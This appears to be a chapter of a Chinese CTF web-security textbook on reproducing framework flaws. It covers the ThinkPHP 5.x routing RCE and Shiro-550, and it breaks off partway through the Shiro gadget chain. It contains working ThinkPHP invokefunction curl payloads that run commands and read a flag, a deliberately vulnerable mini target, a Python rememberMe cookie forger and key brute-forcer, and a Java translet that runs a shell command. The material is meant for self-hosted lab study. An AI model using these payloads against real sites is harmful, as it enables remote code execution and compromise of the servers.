---
chapter: Web安全
section: CMS 与框架漏洞复现
order: 618
tags:
  - CTF
  - Web安全
  - ThinkPHP
  - Shiro
  - Log4j2
publish: true
---

# W18 CMS 与框架漏洞复现
## CMS & Framework Vulnerability Reproduction

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L3 进阶期 ｜ **前置要求**：[[13-Docker与赛题环境|13 章]] · [[W12-PHP反序列化|W12]] · [[W09-SSTI|W09]]
> **本章目标**：掌握框架/CMS 漏洞的复现方法——指纹识别、版本定位、漏洞库检索、复现环境获取，以及复现过程中绕不开的版本差异处理；把三个里程碑漏洞各自从原理讲到打靶：ThinkPHP 5.x 路由调用 RCE（路由分发把控制器名反射成类调用）、Shiro-550 RememberMe 反序列化（硬编码 AES 密钥）、Log4j2 JNDI 注入（日志消息里的 `${jndi:}` lookup）；最后落在防御与运营视角。

[[W05-命令注入与代码执行|W05]] 到 [[W12-PHP反序列化|W12]] 的靶子都是"几十行自建代码"：漏洞逻辑摆在明面上，练的是注入手法本身。真实赛题与真实世界的漏洞更多住在**框架和 CMS 这类第三方组件**里——代码不是出题人写的，漏洞是上游带下来的，解题的第一步从"读源码"变成"认组件、定版本、找编号"。本章建立的就是这套复现方法，然后用三个不同语言、不同机理的里程碑漏洞各走一遍：

| 漏洞 | 组件 | 机理 | 一句话 |
| ---- | ---- | ---- | ---- |
| 路由调用 RCE | ThinkPHP 5.0/5.1 | 路由分发把控制器名当类名反射调用 | 输入决定"调用哪个类的哪个方法" |
| Shiro-550（CVE-2016-4437） | Apache Shiro | rememberMe cookie 用硬编码 AES 密钥加密序列化对象 | 密钥公开，cookie 即可控的反序列化入口 |
| Log4Shell（CVE-2021-44228） | Apache Log4j2 | 日志消息被 lookup 语法二次解析 | 输入决定"发起一次 JNDI 请求" |

三个洞各有一层共同结构：==框架把"数据"位置上的输入升格成了"代码/指令"来解释==——这与 [[W09-SSTI|W09]] 的模板注入、[[W12-PHP反序列化|W12]] 的反序列化是同一条原理在不同组件上的落点。[[W09-SSTI#7. Twig 与 Smarty 速览|W09 第 7 节]]看的是"框架自带引擎被注入"，本章看的是"框架自身的分发/加密/日志代码有洞"，边界就画在这里。[[W12-PHP反序列化#3. POP 链：从读源码到命令执行|W12 第 3 节]]的 POP 链讲的是 PHP 的"恢复对象不执行、执行要靠已有方法"，Java 反序列化是它的对照面：`readObject` 本身就会触发链上第一个方法，[[W15-Python反序列化与沙箱逃逸|W15]] 的 pickle `__reduce__` 与之同侧，第 3 节展开。

> [!note] 本章的实验约定
> PHP 侧以 php 8.5 起靶，Java 侧以 openjdk 21 起靶，涉及旧版本行为处单独写清版本背景——这类漏洞对组件版本与 JDK 版本都敏感，"版本差异"本身就是本章的知识点之一。端口用 9800 段；curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容），URL 里的特殊字符交给 `-G --data-urlencode`（[[W09-SSTI|W09]] 的实验约定同款）。

## 1. 复现方法论：从指纹到靶场

### 1.1 指纹识别：先认出"这是什么"

打组件漏洞的前提是知道目标用了什么组件、什么版本。常见指纹来源，按隐蔽性从低到高：

| 指纹来源 | 例子 | 说明 |
| ---- | ---- | ---- |
| 静态文件 | `composer.json`、`composer.lock`、`package.json`、`WEB-INF/lib/` 下的 jar 名 | 仓库/备份泄露时一步到位（[[W03-信息泄露与前端安全\|W03]] 的泄露面） |
| 响应头 | `X-Powered-By: ThinkPHP`、`Server` 头里的容器/框架字样 | 一条响应就能报框架 |
| 报错页 | 框架专属的异常页样式、Stack trace 里的包名类名 | 报错信息是框架名与版本的自我介绍 |
| 特征路由 | `?s=` 参数驱动路由是 ThinkPHP 的兼容模式形态；`/index.php/module/action` 同理 | 路由形态就是框架的指纹 |
| 行为探针 | 给 Shiro 应用发任意 `rememberMe` cookie，响应头出现 `rememberMe=deleteMe` | 不依赖报错，主动问一次就有答案 |

行为探针值得多看一眼：`deleteMe` 是 Shiro 对"无法恢复的 rememberMe cookie"的标准回应（第 3 节的靶子里能看到这行逻辑的出处），==只要响应里出现过它，目标就是 Shiro==，这条探针也是 Shiro-550 利用链的第一步。

### 1.2 版本定位与漏洞库检索

认出组件后，把版本钉死：

- **依赖清单**：`composer show`、`pip list`、`mvn dependency:tree` 一类命令直接列出组件与版本；拿到 shell 后这是第一动作；
- **发布物比对**：静态文件里的 `CHANGELOG`、版本常量（ThinkPHP 的 `thinkphp/base.php` 里有一行 `THINK_VERSION`）、jar 包文件名；
- **框架接口行为**：同一探测输入在不同小版本上行为不同（第 2.4 节的 payload 差异就是版本探测器）。

版本定了，去漏洞库检索。四类入口覆盖面互补：

| 库 | 内容 | 特点 |
| ---- | ---- | ---- |
| CVE / NVD | 国际编号与描述 | 编号是沟通的通用语，题解、工具、通告都以 CVE 互指 |
| CNVD / CNNVD | 国内收录 | 国内组件（ThinkPHP 是典型）的公告与编号更全 |
| GitHub Advisory | 生态绑定，`composer audit`、`npm audit` 直接对接 | 数据就是第 5 节依赖告警的来源 |
| exploit-db / payload 合集 | 现成 payload 与利用笔记 | 复现的起点，但版本前提要自己核对 |

检索词用"组件名 + 版本号 + RCE/漏洞"组合，命中的编号再回 GitHub Advisory 看影响区间。==确认"目标版本落在影响区间内"之后才动手，这一步能省掉后面全部无效打靶==。

### 1.3 复现环境怎么来

| 途径 | 动作 | 适合 |
| ---- | ---- | ---- |
| 官方发布物 | 组件官方仓库 checkout 旧 tag、Maven Central/npm 下载旧版本包 | 精确控制版本，贴近源码阅读 |
| 包管理器固定版本 | `composer create-project 顶部包=旧版本`、`pip install 包==旧版本` | 一条命令得到可运行项目 |
| 漏洞镜像 | vulhub 一类题库的 docker-compose（[[13-Docker与赛题环境\|13 章]] 的用法） | 开箱即打，版本与靶场说明齐全 |
| 发行版旧包 | apt/yum 的历史仓库、旧系统镜像 | 组件与旧系统绑定的场景（如旧 JDK） |

> [!warning] 授权与法律边界
> 本章与全书的一切打靶都发生在==自建靶==上：靶子来自自己下载的源码、自己起的进程、自己监听的端口。对未授权目标使用本章任何 payload 属于违法行为，CTF 训练与真实渗透的分界线就是书面授权，这条红线没有例外。

> [!note] 版本差异是复现工作的常态
> 旧组件运行在旧环境（旧 PHP、旧 JDK、旧系统库）上，而手头的环境往往比它们新。复现工作的相当一部分时间花在"让旧代码在新环境里跑起来"：处理废弃语法、替代被移除的默认值、给老依赖补齐。本章三个漏洞的复现都会遇到并展示这类处理，它们不是杂音，是理解"这个洞当年为什么能打"的必要背景。

## 2. ThinkPHP 5.x 路由调用 RCE

### 2.1 漏洞机理：控制器名直达反射调用

ThinkPHP 5 在没有 URL 重写的部署下，靠兼容模式参数 `?s=` 传路由，格式是 `模块/控制器/操作`。2018 年 12 月曝光的 RCE 一族（CVE-2018-20062 及同期编号）根子在路由分发对**控制器名**的处理上。看 5.0.22 的真实源码（`library/think/App.php`，`App::module()`）：

```php
// 获取控制器名
$controller = strip_tags($result[1] ?: $config['default_controller']);
$controller = $convert ? strtolower($controller) : $controller;
```

`strip_tags` 只剥 HTML 标签，==控制器名没有任何字符白名单==。这个字符串随后交给 `Loader`（`library/think/Loader.php`，`getModuleAndClass()`）：

```php
protected static function getModuleAndClass($name, $layer, $appendSuffix)
{
    if (false !== strpos($name, '\\')) {
        $module = Request::instance()->module();
        $class  = $name;              // 控制器名带反斜杠：直接按命名空间类名解析
    } else {
        ...
        $class = self::parseClass($module, $layer, $name, $appendSuffix);
    }

    return [$module, $class];
}
```

==控制器名里出现 `\` 时，它不再拼接模块前缀，而是被当成完整的命名空间类名交给 `class_exists()`==。框架自己有一个类恰好是万能跳板：`think\app`（框架核心 `App` 类），它身上挂着这个方法（`App::invokeFunction()`）：

```php
public static function invokeFunction($function, $vars = [])
{
    $reflect = new \ReflectionFunction($function);
    $args    = self::bindParams($reflect, $vars);

    // 记录执行信息
    self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');

    return $reflect->invokeArgs($args);
}
```

`ReflectionFunction` 接受任意函数名字符串，`bindParams` 按**参数名**从请求参数里取值。于是整条链闭合：

```
?s=/index/\think\app/invokefunction   → 路由解析出 控制器 = "\think\app"，操作 = "invokefunction"
&function=call_user_func_array        → 绑定到 invokeFunction 的 $function 参数
&vars[0]=system&vars[1][]=id          → 绑定到 $vars 参数
→ call_user_func_array('system', ['id']) → 命令执行
```

==输入一路控制了"实例化哪个类、调用哪个方法、传什么参数"==——这就是"路由调用"类漏洞的完整含义。修复也直白：5.0.23 给 `App::module()` 补了控制器名正则（5.1 行的路由重写过了，等价修复落在 `route/dispatch/Url.php`，5.1.31 引入）：

```php
if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
    throw new HttpException(404, 'controller not exists:' . $controller);
}
```

正则不允许 `\`，命名空间类名从此进不了控制器位。

### 2.2 行为等价最小靶

按上面三段真实代码的逻辑缩减一个最小靶，==类名就取 `think\app`，payload 形态与真实框架逐字节一致==：

```php
<?php
// mini.php —— 行为等价最小靶：s 参数路由 → 控制器名解析 → 反射调用
namespace app\index\controller
{
    class Hello
    {
        public function index($name = 'guest')
        {
            return 'Hello, ' . htmlspecialchars($name);
        }
    }
}

// 框架同名类：真实框架里它就是 think\app
namespace think
{
    class app
    {
        // App::invokeFunction()：函数名与参数数组全部来自查询串，反射执行
        public function invokefunction($function, $vars = [])
        {
            $reflect = new \ReflectionFunction($function);
            return $reflect->invokeArgs($vars);
        }
    }
}

namespace
{
    class MiniApp
    {
        public static function run(): void
        {
            // Request::pathinfo()：var_pathinfo 默认 's'，兼容模式路由参数
            $path = $_GET['s'] ?? '/';
            unset($_GET['s']);

            // Route::parseUrlPath()：按 / 切成 模块/控制器/操作
            $result = explode('/', trim(str_replace('|', '/', $path), '/'));
            $module     = strip_tags($result[0] ?: 'index');
            $controller = strip_tags($result[1] ?: 'index');   // 5.0.22：此处无任何过滤
            $action     = strip_tags($result[2] ?: 'index');

            // Loader::getModuleAndClass()：控制器名带 \ 时按命名空间类名直接解析
            if (false !== strpos($controller, '\\')) {
                $class = $controller;
            } else {
                $class = 'app\\' . $module . '\\controller\\' . ucfirst($controller);
            }

            if (!class_exists($class)) {
                http_response_code(404);
                exit('controller not exists: ' . htmlspecialchars($class) . "\n");
            }
            // Loader::controller() → App::invokeClass()：反射实例化
            $instance = (new ReflectionClass($class))->newInstance();

            if (!is_callable([$instance, $action])) {
                http_response_code(404);
                exit('method not exists: ' . htmlspecialchars($class) . '->' . $action . "()\n");
            }

            // App::invokeMethod()：反射方法，参数按名字从查询串绑定
            $reflect = new ReflectionMethod($instance, $action);
            $args = [];
            foreach ($reflect->getParameters() as $p) {
                $name = $p->getName();
                if (array_key_exists($name, $_GET)) {
                    $args[] = $_GET[$name];
                } elseif ($p->isDefaultValueAvailable()) {
                    $args[] = $p->getDefaultValue();
                } else {
                    $args[] = null;
                }
            }
            echo $reflect->invokeArgs($instance, $args);
        }
    }
    MiniApp::run();
}
```

先看正常路由，再看 payload（起靶：`php -S 127.0.0.1:9811 -t w18mini`，请求打 `mini.php`）：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9811/mini.php' \
  --data-urlencode 's=/index/hello/index' \
  --data-urlencode 'name=ctf'
```

输出：

```
Hello, ctf
```

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9811/mini.php' \
  --data-urlencode 's=/index/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode 'vars[1][]=id'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

命令输出出现两次是 `system()` 的语义：它把命令输出直接打到响应，又把最后一行作为返回值交给靶子的 `echo`——一行命令，两处呈现。URL 里的 `\think\app` 必须经 `--data-urlencode` 编码后传输（curl 会拒绝 URL 里的裸反斜杠），服务端解码后得到的就是原始 payload。

补丁对照：把 5.0.23 那条正则原样加进解析流程（`mini_fixed.php`，其余与 `mini.php` 相同），同一发 payload：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9811/mini_fixed.php' \
  --data-urlencode 's=/index/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode 'vars[1][]=id'
curl -s --noproxy '*' -G 'http://127.0.0.1:9811/mini_fixed.php' \
  --data-urlencode 's=/index/hello/index' \
  --data-urlencode 'name=ctf'
```

输出：

```
controller not exists: \think\app
```

```
Hello, ctf
```

==恶意路由被正则拦下、正常路由不受影响==——一行白名单就是全部修复内容，漏洞与补丁都值得这样对读。

### 2.3 真实框架复现

最小靶讲清机理，真实框架补上"拿到环境"这一课。composer 是 [[W12-PHP反序列化|W12]] 提过的 PHP 依赖管理器（phar 单文件即可用），用它建一个钉死版本的 5.0.22 项目。第一发会被现代工具链拦下来：

```bash
composer create-project topthink/think=5.0.22 tp50 --no-interaction --prefer-dist
```

输出：

```
Your requirements could not be resolved to an installable set of packages.

  Problem 1
    - Root composer.json requires topthink/framework 5.0.*, found topthink/framework[5.0, ..., v5.0.25] but these were not loaded, because they are affected by security advisories ("PKSA-1h4d-g3yk-64z8", "PKSA-qzw1-yq5b-y8j5", ...) Go to https://packagist.org/security-advisories/ to find advisory details. To ignore the advisories, add their IDs to the "policy.advisories.ignore-id" config or add the package to "policy.advisories.ignore". To turn the feature off entirely, you can set "policy.advisories.block" to false.
```

==依赖管理器拒绝安装带已知漏洞通告的版本==——防御侧在第 5 节还会回来收这笔账。复现目的下按它给出的开关放行：

```bash
composer config -g allow-plugins.topthink/think-installer true
composer create-project topthink/think=5.0.22 tp50 --no-interaction --prefer-dist --no-security-blocking
```

输出（节选）：

```
Installing topthink/think (v5.0.22)
Created project in .../tp50
Loading composer repositories with package information
Updating dependencies
  - Downloading topthink/framework (v5.0.25)
  - Installing topthink/framework (v5.0.25): Extracting archive
Found 11 security vulnerability advisories affecting 1 package.
```

骨架的约束是 `5.0.*`，装到的是已修复的 5.0.25；把 `composer.json` 里的约束改成 `5.0.22` 后单独更新框架：

```bash
composer update topthink/framework --no-security-blocking
grep THINK_VERSION thinkphp/base.php
```

输出：

```
  - Downgrading topthink/framework (v5.0.25 => v5.0.22): Extracting archive
Found 13 security vulnerability advisories affecting 1 package.
```

```
12:define('THINK_VERSION', '5.0.22');
```

版本就位。旧代码跑在新 PHP 上要先过两处环境适配：PHP 8.4 起"隐式 nullable 参数"标记为弃用，而 5.0 的错误处理器会把弃用告警抛成异常，等于框架在自己第一行代码上绊倒；框架默认时区 `PRC` 已被新版 PHP 移除。两处各改一行：

```bash
# 弃用告警不再抛异常：错误处理器的报告级别排除 E_DEPRECATED
sed -i 's/error_reporting(E_ALL);/error_reporting(E_ALL \& ~E_DEPRECATED);/' thinkphp/library/think/Error.php
grep -n 'error_reporting(E_ALL' thinkphp/library/think/Error.php

# 默认时区换成现用时区
sed -i "s/'default_timezone'       => 'PRC'/'default_timezone'       => 'Asia\/Shanghai'/" application/config.php
grep -n 'default_timezone' application/config.php
```

输出：

```
28:        error_reporting(E_ALL & ~E_DEPRECATED);
```

```
40:    'default_timezone'  => 'Asia/Shanghai',
```

起靶、放一个 flag、打原版 payload：

```bash
echo 'w18flag{tp5_r0ut3_r3fl3ct}' > application/w18flag.txt
php -S 127.0.0.1:9801 -t public
curl -s --noproxy '*' -G 'http://127.0.0.1:9801/' \
  --data-urlencode 's=/index/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode 'vars[1][]=id'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

读 flag（注意 `php -S` 的工作目录是 `-t` 指定的 docroot，`application/` 在它的上一级）：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9801/' \
  --data-urlencode 's=/index/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode 'vars[1][]=cat ../application/w18flag.txt'
```

输出：

```
w18flag{tp5_r0ut3_r3fl3ct}
w18flag{tp5_r0ut3_r3fl3ct}
```

两点如实说明。一是==真实框架上这条漏洞路径不依赖业务代码==：`think\app` 是框架自带的类，哪怕站点一个控制器都没写，payload 照打。二是 2018 年的框架在新 PHP 上还有其余不兼容点（默认首页等业务路由会报错），但漏洞路径只经过"路由解析 → 反射调用"这一小段，不受影响——这也解释了为什么同一个 payload 在新旧环境里表现一致。

### 2.4 版本差异与时间线

对读三个版本的源码，修复时间线与 payload 差异都有出处：

| 版本 | 修复内容 | 位置（源码 diff 所见） |
| ---- | ---- | ---- |
| 5.0.22 及更早 | —— | 控制器名无过滤，`invokefunction` 链可用 |
| 5.0.23（2018-12-09） | 控制器名正则 `/^[A-Za-z](\w|\.)*$/` | `App::module()` |
| 5.0.24（2019-01-11） | 请求方法伪造链的修复：`_method` 参数只允许 GET/POST/DELETE/PUT/PATCH | `Request::method()` |
| 5.1.31（2018-12-11） | 控制器名正则（同一条） | `route\dispatch\Url`（5.1 重写了路由，修复位置随之改变） |

> [!info]- 第二条链：_method 方法伪造
> 修复 `invokefunction` 的 5.0.23 仍带着姊妹洞：`Request::method()` 读取 POST 里的 `_method` 参数并**直接以其命名调用自身的同名方法**，攻击者传 `_method=__construct` 让构造函数在请求期重跑，把 `filter` 属性覆盖成 `system`，后续取值时过滤函数执行命令——这是 CVE-2018-20062 下另一条常被引用的利用链，5.0.24 用方法名白名单堵上（上表的 diff 所见）。同族漏洞修一条、冒一条，是框架漏洞时间线的常态。

payload 的版本差异同样有机理可循：5.1 行重写路由后，分发逻辑从 `App` 挪进了 `route\dispatch\*` 类，可被调用的框架类与方法名随之变化——题解里 5.0 与 5.1 的 payload 长得不一样，不是姿势不同，==是"哪个类有什么方法"这张清单被框架版本改写了==。遇到 payload 不生效，先核版本，再回对应版本的源码里核对清单。

## 3. Shiro-550：RememberMe 硬编码密钥

### 3.1 漏洞机理：cookie 即反序列化入口

Shiro 的"记住我"功能把登录身份序列化后加密存进 cookie，下次请求解密反序列化恢复身份。1.2.4 及之前的版本，这条链上的 AES 密钥是**硬编码在源码里**的（`AbstractRememberMeManager.java`，shiro-core 1.2.4）：

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

构造函数里 `setCipherKey(DEFAULT_CIPHER_KEY_BYTES)` 直接启用它。恢复身份的流程（同一文件）：

```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
    try {
        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
        if (bytes != null && bytes.length > 0) {
            principals = convertBytesToPrincipals(bytes, subjectContext);
        }
    } catch (RuntimeException re) {
        principals = onRememberedPrincipalFailure(re, subjectContext);
    }

    return principals;
}

protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (getCipherService() != null) {
        bytes = decrypt(bytes);
    }
    return deserialize(bytes);
}
```

cookie 的字节格式：`base64( IV ‖ AES-CBC(key, IV, PKCS5Padding(序列化数据)) )`（web 层的 `CookieRememberMeManager` 先做 base64 解码，密文首 16 字节是 IV）。==密钥公开 + 序列化数据可被替换==，[[W12-PHP反序列化|W12]] 3.1 的结论平移过来：串里能写什么，链上就走到什么。异常路径是 1.1 节 `deleteMe` 探针的出处：`onRememberedPrincipalFailure` 调 `forgetIdentity`，`CookieRememberMeManager` 的实现就是向响应写一条 `Set-Cookie: rememberMe=deleteMe`。

> [!note] 与 PHP 侧 POP 链的对照
> [[W12-PHP反序列化#3. POP 链：从读源码到命令执行|W12 第 3 节]]的核心结论是"unserialize 本身只恢复对象，执行要靠靶上已有的类与方法串成链"；[[W12-PHP反序列化#3.1 原理：面向属性编程|W12 3.1]] 的"找终点、找跳板、接源头"三步原样适用于构造 Java 链，终点换成 Java 侧的执行原语。Java 侧机制相同、起点更早：`ObjectInputStream.readObject()` 在恢复对象的过程中就会执行链上第一个方法（例如 `PriorityQueue.readObject` 内部的堆整理会调用比较器），链不需要等对象销毁。

### 3.2 攻击侧：伪造 cookie

加密格式完全公开，用 Python 复刻加密侧（pycryptodome，[[W12-PHP反序列化|W12]] 的字符逃逸靶同一类"自己构造字节流"的思路）：

```python
# forge_rememberme.py —— 伪造 Shiro rememberMe cookie
# 格式: base64( IV(16 字节) || AES-256-CBC(key, IV, PKCS7(序列化数据)) )
import sys, os, base64
from Crypto.Cipher import AES

DEFAULT_KEY = 'kPH+bIxk5D2deZiIxcaaaA=='   # shiro-core 1.2.4 AbstractRememberMeManager 硬编码


def pkcs7(b: bytes) -> bytes:
    n = 16 - len(b) % 16
    return b + bytes([n]) * n


def forge(data: bytes, key_b64: str) -> str:
    key = base64.b64decode(key_b64)
    iv = os.urandom(16)
    c = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(iv + c.encrypt(pkcs7(data))).decode()


if __name__ == '__main__':
    payload_file = sys.argv[1]
    key = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_KEY
    data = open(payload_file, 'rb').read()
    print(forge(data, key))
```

### 3.3 最小靶：驱动真实 shiro-core 的解密路径

靶子不重写 Shiro 的逻辑，直接把 shiro-core 1.2.4 的 jar 放上 classpath，补三个与存储有关的空方法（真实框架里它们对接 servlet 会话与容器）：

```java
import org.apache.shiro.mgt.AbstractRememberMeManager;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.subject.Subject;
import org.apache.shiro.subject.SubjectContext;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class ShiroVictim {

    static class Lab extends AbstractRememberMeManager {
        @Override
        protected void forgetIdentity(Subject subject) {
            // CookieRememberMeManager 里这一步会向响应写 rememberMe=deleteMe
            System.out.println("[victim] forgetIdentity called -> Set-Cookie: rememberMe=deleteMe");
        }

        @Override
        public void forgetIdentity(SubjectContext subjectContext) {
            System.out.println("[victim] forgetIdentity called -> Set-Cookie: rememberMe=deleteMe");
        }

        @Override
        protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
        }

        @Override
        protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
            return new byte[0];
        }
    }

    public static void main(String[] args) throws Exception {
        Lab lab = new Lab();
        System.out.println("[victim] hardcoded default key = "
                + java.util.Base64.getEncoder().encodeToString(lab.getEncryptionCipherKey()));

        byte[] cookie = java.util.Base64.getDecoder().decode(args[0]);
        System.out.println("[victim] received rememberMe cookie, " + cookie.length + " bytes after base64 decode");

        byte[] plain;
        try {
            // ① 真实 shiro-core 的解密路径（convertBytesToPrincipals 的前半段）
            java.lang.reflect.Method dec = AbstractRememberMeManager.class
                    .getDeclaredMethod("decrypt", byte[].class);
            dec.setAccessible(true);
            plain = (byte[]) dec.invoke(lab, cookie);
            System.out.println("[victim] decrypted " + plain.length
                    + " bytes, magic = " + String.format("%02x%02x%02x%02x",
                    plain[0], plain[1], plain[2], plain[3]));
        } catch (java.lang.reflect.InvocationTargetException ite) {
            System.out.println("[victim] exception: " + ite.getCause());
            System.out.println("[victim] request finished");
            return;
        }

        // ② 反序列化（readObject 触发 gadget 链）
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(plain))) {
            Object o = ois.readObject();
            System.out.println("[victim] restored: " + o);
        } catch (ClassNotFoundException | java.io.IOException | RuntimeException e) {
            System.out.println("[victim] exception after readObject: " + e);
        }
        System.out.println("[victim] request finished");
    }
}
```

② 用标准 `ObjectInputStream` 而不是 shiro 自带序列化器，原因在 3.6 与常见问题表：较新 JDK 上 shiro 1.2.4 的类解析器处理不了字节数组的类名，真实漏洞环境（旧 JDK）没有这个问题，两边的 `readObject` 行为等价。编译与运行（classpath 里的四个 commons/slf4j jar 是 shiro-core 与 gadget 链的依赖，Maven Central 直接下载）：

```bash
CP=shiro-core-1.2.4.jar:commons-beanutils-1.9.4.jar:commons-collections-3.2.1.jar:commons-logging-1.2.jar:slf4j-api-1.6.4.jar:slf4j-nop-1.6.4.jar
javac -cp $CP ShiroVictim.java
```

**正确密钥 + 无害对象**：先用 Java 生成一个无害的序列化 `ArrayList`（`SerBenign.java`，`ObjectOutputStream.writeObject(new ArrayList)` 十行），伪造 cookie 打靶：

```bash
java -cp $CP:. SerBenign benign.ser
COOKIE=$(python3 forge_rememberme.py benign.ser)
echo "cookie: ${COOKIE:0:44}..."
java -cp $CP:. ShiroVictim "$COOKIE"
```

输出：

```
serialized to benign.ser
cookie: H3B7p1AmjlXM6FGv20H9du/qkF+BTNB4ThyXauje9I04...
[victim] hardcoded default key = kPH+bIxk5D2deZiIxcaaaA==
[victim] received rememberMe cookie, 96 bytes after base64 decode
[victim] decrypted 72 bytes, magic = aced0005
[victim] restored: [alice, bob]
[victim] request finished
```

`aced0005` 是 Java 序列化流的魔数，解密后的字节流被原样恢复成 `ArrayList`——==密钥正确时，cookie 里的序列化数据被服务端完整还原==。

**错误密钥**：同一个无害对象，换成字典里另一个 key 加密：

```bash
COOKIE2=$(python3 forge_rememberme.py benign.ser 'Z3VucwAAAAAAAAAAAAAAAA==')
java -cp $CP:. ShiroVictim "$COOKIE2"
```

输出：

```
[victim] hardcoded default key = kPH+bIxk5D2deZiIxcaaaA==
[victim] received rememberMe cookie, 96 bytes after base64 decode
[victim] exception: org.apache.shiro.crypto.CryptoException: Unable to execute 'doFinal' with cipher instance [Cipher.AES/CBC/PKCS5Padding, mode: decryption, algorithm from: SunJCE].
[victim] request finished
```

PKCS5 去填充失败抛出 `CryptoException`——真实应用里这条路径被 `onRememberedPrincipalFailure` 接住、回写 `deleteMe`。==同一个接口对正确与错误密钥给出可区分的响应==，这就是下一节爆破的立足点。

### 3.4 密钥爆破

攻击者没有源码时，拿一份公开流传的 Shiro 常用 key 字典逐个试：对每个候选 key 做 AES-CBC 解密，==解密结果首 4 字节是 `AC ED 00 05` 且填充合法的，就是密钥==：

```python
# brute_key.py —— 对同一 cookie 逐个试已知 key，
# 解密成功且首 4 字节为 Java 序列化魔数 AC ED 00 05 的即为正确密钥
import sys, base64
from Crypto.Cipher import AES

# 常见公开字典（节选自社区维护的 shiro_key 列表）
KEYS = [
    'kPH+bIxk5D2deZiIxcaaaA==',
    'Z3VucwAAAAAAAAAAAAAAAA==',
    '2AvVhdsgUs0FSA3SDFAdag==',
    'MTIzNDU2Nzg5MGFiY2RlZg==',
]

def unpad(b: bytes) -> bytes:
    n = b[-1]
    return b[:-n] if 1 <= n <= 16 else b

cookie = base64.b64decode(open(sys.argv[1]).read().strip())
iv, body = cookie[:16], cookie[16:]

for k in KEYS:
    key = base64.b64decode(k)
    if len(key) not in (16, 24, 32):
        continue
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(body)
    magic = pt[:4]
    if magic == b'\xac\xed\x00\x05' and unpad(pt) is not None:
        pad_ok = 1 <= pt[-1] <= 16 and pt[-pt[-1]:] == bytes([pt[-1]]) * pt[-1]
        if pad_ok:
            print(f'{k}  -> ACED magic + padding OK   <== hit')
        else:
            print(f'{k}  -> ACED magic, padding bad')
    else:
        print(f'{k}  -> garbage')
```

把上一节"错误密钥"的 cookie 存下来跑爆破：

```bash
echo "$COOKIE2" > cookie_wrong.b64
python3 brute_key.py cookie_wrong.b64
```

输出：

```
kPH+bIxk5D2deZiIxcaaaA==  -> garbage
Z3VucwAAAAAAAAAAAAAAAA==  -> ACED magic + padding OK   <== hit
2AvVhdsgUs0FSA3SDFAdag==  -> garbage
MTIzNDU2Nzg5MGFiY2RlZg==  -> garbage
```

真实场景里爆破不需要本地靶：向目标发每个候选 key 加密的 cookie，看响应里是否缺了 `rememberMe=deleteMe` 就能区分——离线版与本节输出同构，只是把"PKCS5 填充失败"换成了 3.3 错误密钥那一幕。

### 3.5 gadget 链：从 readObject 到命令执行

反序列化入口拿到了，链的终点选 CommonsBeanutils1（CB1）——它依赖的 commons-beanutils 在 Shiro 应用里几乎必在（Shiro 自己用它做权限校验的属性比较）。链的五跳：

| 跳 | 类/方法 | 做什么 |
| ---- | ---- | ---- |
| 入口 | `PriorityQueue.readObject()` | 恢复队列时整理堆，调用比较器比较元素 |
| 中转 | `BeanComparator.compare()` | 用 commons-beanutils 按**属性名**取对象属性 |
| 触发 | `TemplatesImpl.getOutputProperties()` | 属性名设为 `outputProperties`，走到模板转换逻辑 |
| 加载 | `TemplatesImpl.defineTransletClasses()` | 把对象里携带的字节数组当 Java 类加载 |
| 终点 | 被加载类的静态块 | ==类初始化即执行其中的代码== |

链的构造代码（生成侧）分两件东西。被注入的恶意类，继承 XSLTC 的 `AbstractTranslet`，静态块执行命令：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTranslet extends AbstractTranslet {

    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "id > /tmp/w18_shiro_hit"});
        } catch (Exception ignored) {
        }
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
}
```

